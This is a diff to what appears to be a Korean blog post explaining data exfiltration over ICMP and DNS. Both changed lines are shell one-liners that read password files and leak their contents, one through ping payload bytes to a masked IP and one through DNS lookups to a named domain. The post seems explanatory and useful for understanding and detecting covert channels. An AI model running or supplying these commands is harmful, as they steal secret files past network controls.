@@ -138,7 +138,7 @@ TELNET 프로토콜은 원격에서 쉘에 접근할 수 있는 서비스를 제
 
 ICMP 프로토콜은 목적지 IP에 대해 상태를 점검 하거나, management하기 위해 사용되는 서비스다. 보통 우리가 자주 쓰는 ping 명령어 또한 ICMP 메세지를 통해 전송되는 것이며, 위 내용과는 조금 다른 방식으로 사용된다.
 
-- cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done
+- Cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done
 
 <img src="{{ site.url }}/images/2017-03-12/13.png" style="display: block; margin: auto;">
 
@@ -152,7 +152,7 @@ ICMP 프로토콜은 목적지 IP에 대해 상태를 점검 하거나, manageme
 
 DNS 프로토콜은 Domain name에 해당하는 IP 주소를 DNS 서버에 요청하여, 목적지 URL의 IP를 알아 오는 역할이다.
 
--  cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done
+- cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done
 
 <img src="{{ site.url }}/images/2017-03-12/15.png" style="display: block; margin: auto;">
 
